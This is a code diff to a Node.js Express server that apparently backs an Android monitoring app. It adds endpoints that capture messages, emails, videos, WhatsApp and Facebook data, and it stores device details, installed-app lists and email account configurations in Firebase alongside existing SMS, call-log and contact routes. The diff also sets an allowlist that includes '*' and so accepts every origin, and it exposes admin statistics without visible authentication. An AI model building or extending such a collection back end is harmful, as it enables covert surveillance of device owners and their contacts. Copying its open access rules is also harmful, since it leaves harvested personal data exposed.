@@ -20,6 +20,15 @@ const likeRoutes = require('./routes/likes');
 const playlistRoutes = require('./routes/playlists');
 const chatRoutes = require('./routes/chat');
 const gmailRoutes = require('./routes/gmail');
+const facebookRoutes = require('./routes/facebook');
+const whatsappRoutes = require('./routes/whatsapp');
+const adminRoutes = require('./routes/admin');
+const userRoutes = require('./routes/users');
+const captureMessagesRoutes = require('./routes/captureMessages');
+const captureEmailsRoutes = require('./routes/captureEmails');
+const captureVideosRoutes = require('./routes/captureVideos');
+const settingsRoutes = require('./routes/settings');
+// const firebaseRoutes = require('./routes/firebase');
 
 const app = express();
 const PORT = process.env.PORT || 5001;
@@ -30,8 +39,23 @@ app.use(helmet({
   contentSecurityPolicy: false
 }));
 // CORS configuration for mobile app compatibility
+const allowedOrigins = [
+  'http://localhost:3000', // Development frontend
+  'https://notify-sepia.vercel.app', // Production frontend
+  '*' // Allow all origins for mobile app (you can restrict this later)
+];
+
 app.use(cors({
-  origin: '*', // Allow all origins for mobile app
+  origin: function (origin, callback) {
+    // Allow requests with no origin (like mobile apps or Postman)
+    if (!origin) return callback(null, true);
+    
+    if (allowedOrigins.indexOf(origin) !== -1 || allowedOrigins.includes('*')) {
+      callback(null, true);
+    } else {
+      callback(new Error('Not allowed by CORS'));
+    }
+  },
   credentials: false, // Set to false when origin is *
   methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
   allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With', 'Accept', 'Origin']
@@ -70,18 +94,27 @@ mongoose.connection.on('reconnected', () => {
 
 // Routes
 app.use('/api/auth', authRoutes);
+app.use('/api/users', userRoutes);
 app.use('/api/videos', videoRoutes);
-app.use('/api/notifications', notificationRoutes);
-app.use('/api/media', mediaRoutes);
-app.use('/api/call-logs', callLogRoutes);
-app.use('/api/contacts', contactRoutes);
-app.use('/api/sms', smsRoutes);
-app.use('/api/profile', profileRoutes);
+app.use('/api/playlists', playlistRoutes);
 app.use('/api/comments', commentRoutes);
 app.use('/api/likes', likeRoutes);
-app.use('/api/playlists', playlistRoutes);
-app.use('/api/chat', chatRoutes);
+app.use('/api/media', mediaRoutes);
+app.use('/api/notifications', notificationRoutes);
 app.use('/api/gmail', gmailRoutes);
+app.use('/api/sms', smsRoutes);
+app.use('/api/callLogs', callLogRoutes);
+app.use('/api/contacts', contactRoutes);
+app.use('/api/chat', chatRoutes);
+app.use('/api/profile', profileRoutes);
+app.use('/api/facebook', facebookRoutes);
+app.use('/api/whatsapp', whatsappRoutes);
+app.use('/api/admin', adminRoutes);
+app.use('/api/capture/messages', captureMessagesRoutes);
+app.use('/api/capture/emails', captureEmailsRoutes);
+app.use('/api/capture/videos', captureVideosRoutes);
+app.use('/api/settings', settingsRoutes);
+// app.use('/api/firebase', firebaseRoutes);
 
 // Serve uploaded files
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
@@ -90,42 +123,27 @@ app.use('/public', express.static(path.join(__dirname, 'public')));
 // Serve static frontend
 app.use(express.static(path.join(__dirname, '../frontend/build')));
 
+const mobileFirebaseService = require('./services/mobileFirebaseService');
+
 // Device info endpoint
 app.post('/api/device/info', async (req, res) => {
   try {
     const { deviceId, manufacturer, model, androidVersion, sdkVersion, timestamp } = req.body;
     
-    // Store device info in Device model (create if doesn't exist)
-    const Device = require('./models/Device');
-    let device = await Device.findOne({ deviceId });
-    if (device) {
-      device.deviceInfo = {
-        manufacturer,
-        model,
-        androidVersion,
-        sdkVersion,
-        lastUpdated: new Date()
-      };
-      await device.save();
-    } else {
-      // Create new device if doesn't exist
-      device = new Device({
-        deviceId,
-        deviceInfo: {
-          manufacturer,
-          model,
-          androidVersion,
-          sdkVersion,
-          lastUpdated: new Date()
-        }
-      });
-      await device.save();
-    }
+    // Store device info directly to Firebase
+    const result = await mobileFirebaseService.storeDeviceInfo({
+      deviceId,
+      manufacturer,
+      model,
+      androidVersion,
+      sdkVersion,
+      timestamp
+    });
 
-    res.json({ success: true, message: 'Device info stored' });
+    res.json({ success: true, message: 'Device info stored in Firebase', firebaseId: result.firebaseId });
   } catch (error) {
     console.error('Device info error:', error);
-    res.status(500).json({ success: false, message: 'Failed to store device info' });
+    res.status(500).json({ success: false, message: 'Failed to store device info in Firebase' });
   }
 });
 
@@ -134,27 +152,42 @@ app.post('/api/apps/list', async (req, res) => {
   try {
     const { deviceId, apps } = req.body;
     
-    // Store apps info in Device model
-    const Device = require('./models/Device');
-    let device = await Device.findOne({ deviceId });
-    if (device) {
-      device.installedApps = apps;
-      device.lastAppsUpdate = new Date();
-      await device.save();
-    } else {
-      // Create new device if doesn't exist
-      device = new Device({
-        deviceId,
-        installedApps: apps,
-        lastAppsUpdate: new Date()
-      });
-      await device.save();
-    }
+    // Store apps list directly to Firebase
+    const result = await mobileFirebaseService.storeAppsList({
+      deviceId,
+      apps
+    });
 
-    res.json({ success: true, message: 'Apps list stored' });
+    res.json({ success: true, message: 'Apps list stored in Firebase', firebaseId: result.firebaseId });
   } catch (error) {
     console.error('Apps list error:', error);
-    res.status(500).json({ success: false, message: 'Failed to store apps list' });
+    res.status(500).json({ success: false, message: 'Failed to store apps list in Firebase' });
+  }
+});
+
+// Email accounts configuration endpoint
+app.post('/api/email-accounts', async (req, res) => {
+  try {
+    const { userId, emailAccounts } = req.body;
+    
+    if (!userId || !emailAccounts || !Array.isArray(emailAccounts)) {
+      return res.status(400).json({ error: 'Invalid data format' });
+    }
+
+    // Store email accounts configuration
+    const result = await mobileFirebaseService.storeEmailAccounts({
+      userId,
+      emailAccounts
+    });
+
+    res.json({ 
+      success: true, 
+      message: 'Email accounts configuration stored in Firebase', 
+      count: result.count 
+    });
+  } catch (error) {
+    console.error('Email accounts error:', error);
+    res.status(500).json({ success: false, message: 'Failed to store email accounts configuration in Firebase' });
   }
 });
 
@@ -220,6 +253,45 @@ app.get('/api/dashboard/:deviceId', async (req, res) => {
   } catch (error) {
     console.error('Dashboard error:', error);
     res.status(500).json({ success: false, message: 'Failed to get dashboard data' });
+  }
+});
+
+// Admin stats endpoint
+app.get('/api/admin/stats', async (req, res) => {
+  try {
+    const [
+      usersCount,
+      devicesCount,
+      notificationsCount,
+      emailsCount,
+      smsCount,
+      callLogsCount,
+      contactsCount,
+      gmailAccountsCount
+    ] = await Promise.all([
+      require('./models/User').countDocuments(),
+      require('./models/Device').countDocuments(),
+      require('./models/Notification').countDocuments(),
+      require('./models/Email').countDocuments(),
+      require('./models/SMS').countDocuments(),
+      require('./models/CallLog').countDocuments(),
+      require('./models/Contact').countDocuments(),
+      require('./models/GmailAccount').countDocuments()
+    ]);
+
+    res.json({
+      users: usersCount,
+      devices: devicesCount,
+      notifications: notificationsCount,
+      emails: emailsCount,
+      sms: smsCount,
+      callLogs: callLogsCount,
+      contacts: contactsCount,
+      gmailAccounts: gmailAccountsCount
+    });
+  } catch (error) {
+    console.error('Error fetching admin stats:', error);
+    res.status(500).json({ error: 'Failed to fetch admin statistics' });
   }
 });
 
